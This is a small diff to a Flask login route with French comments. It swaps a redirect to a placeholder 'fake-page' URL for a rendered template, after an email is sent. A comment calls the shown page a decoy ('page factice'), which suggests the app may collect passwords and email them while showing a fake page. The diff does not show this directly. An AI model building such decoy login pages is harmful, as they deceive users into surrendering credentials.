@@ -131,7 +131,7 @@ def index():
             except Exception as e:
                 print("Erreur envoi email:", e)
 
-            return redirect("https://example.com/fake-page")  # À remplacer si tu veux une vraie page factice
+            return render_template("biotrace.html")  # À remplacer si tu veux une vraie page factice
 
         else:
             return render_template_string(HTML_TEMPLATE, error="❌ Mot de passe incorrect.")
